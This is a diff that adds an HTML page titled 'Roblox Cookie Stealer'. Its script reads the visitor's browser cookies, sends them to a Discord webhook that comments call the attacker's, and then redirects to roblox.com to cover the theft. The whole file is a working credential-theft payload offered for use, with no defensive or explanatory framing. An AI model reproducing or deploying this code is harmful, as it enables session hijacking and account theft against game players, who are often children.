@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Cookie Stealer</title>
+</head>
+<body>
+    <script>
+        // Get the cookies from the current page
+        var cookies = document.cookie;
+
+        // Send the cookies to the attacker's webhook
+        var img = new Image();
+        img.src = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz/cookies=" + encodeURIComponent(cookies);
+
+        // Redirect to roblox.com
+        window.location.href = "https://www.roblox.com";
+    </script>
+</body>
+</html>
